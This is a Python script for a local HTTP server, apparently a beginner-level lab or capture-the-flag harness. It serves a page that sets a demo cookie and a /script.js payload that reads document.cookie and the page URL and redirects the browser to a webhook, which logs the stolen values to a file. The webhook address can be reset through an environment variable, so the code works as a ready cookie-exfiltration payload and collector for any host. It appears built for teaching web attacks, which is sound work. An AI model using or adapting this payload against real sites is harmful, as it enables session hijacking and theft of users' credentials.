#!/usr/bin/env python3
from __future__ import annotations

from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import os
from pathlib import Path
from urllib.parse import parse_qs, urlparse


ROOT = Path(__file__).resolve().parent
HOST = os.environ.get("BABY_HOST", "127.0.0.1")
PORT = int(os.environ.get("BABY_PORT", "8000"))
PUBLIC_HOST = "127.0.0.1" if HOST == "0.0.0.0" else HOST
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", f"http://{PUBLIC_HOST}:{PORT}/webhook")
WEBHOOK_LOG = Path(os.environ.get("WEBHOOK_LOG", ROOT / "webhook.log"))


def build_payload(handler: BaseHTTPRequestHandler, body: bytes = b"") -> dict[str, object]:
    parsed = urlparse(handler.path)
    headers = {key: value for key, value in handler.headers.items()}

    return {
        "received_at": datetime.now(timezone.utc).isoformat(),
        "method": handler.command,
        "path": parsed.path,
        "query": parse_qs(parsed.query),
        "headers": headers,
        "body": body.decode("utf-8", errors="replace"),
        "client": handler.client_address[0],
    }


def append_webhook_log(payload: dict[str, object]) -> None:
    WEBHOOK_LOG.parent.mkdir(parents=True, exist_ok=True)
    with WEBHOOK_LOG.open("a", encoding="utf-8") as log_file:
        log_file.write(json.dumps(payload, ensure_ascii=False, sort_keys=True))
        log_file.write("\n")


class BabyHandler(BaseHTTPRequestHandler):
    server_version = "BabyLocalWebhook/1.0"

    def do_GET(self) -> None:
        parsed = urlparse(self.path)

        if parsed.path in {"/", "/index.html"}:
            self.serve_index()
            return

        if parsed.path == "/script.js":
            self.serve_script_js()
            return

        if parsed.path.startswith("/webhook"):
            self.receive_webhook()
            return

        self.send_error(404, "Not found")

    def do_POST(self) -> None:
        parsed = urlparse(self.path)

        if parsed.path.startswith("/webhook"):
            content_length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(content_length) if content_length else b""
            self.receive_webhook(body)
            return

        self.send_error(404, "Not found")

    def serve_index(self) -> None:
        body = (ROOT / "index.html").read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Set-Cookie", "baby_local=local-demo-cookie; Path=/; SameSite=Lax")
        self.end_headers()
        self.wfile.write(body)

    def serve_script_js(self) -> None:
        script = f"""(() => {{
  const endpoint = new URL({json.dumps(WEBHOOK_URL)});
  endpoint.searchParams.set("cookie", document.cookie || "");
  endpoint.searchParams.set("href", location.href);
  location.assign(endpoint.toString());
}})();
"""
        body = script.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/javascript; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def receive_webhook(self, body: bytes = b"") -> None:
        payload = build_payload(self, body)
        append_webhook_log(payload)

        response = json.dumps(
            {"ok": True, "logged_to": str(WEBHOOK_LOG), "received": payload["query"]},
            ensure_ascii=False,
        ).encode("utf-8")

        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response)

        print(
            f"[webhook] {payload['method']} {payload['path']} "
            f"{json.dumps(payload['query'], ensure_ascii=False)}"
        )

    def log_message(self, format: str, *args: object) -> None:
        print(f"[server] {self.address_string()} - {format % args}")


def main() -> None:
    server = ThreadingHTTPServer((HOST, PORT), BabyHandler)
    print(f"Serving route: http://{PUBLIC_HOST}:{PORT}/")
    print(f"Webhook URL:  {WEBHOOK_URL}")
    print(f"Webhook log:  {WEBHOOK_LOG}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopping server...")


if __name__ == "__main__":
    main()
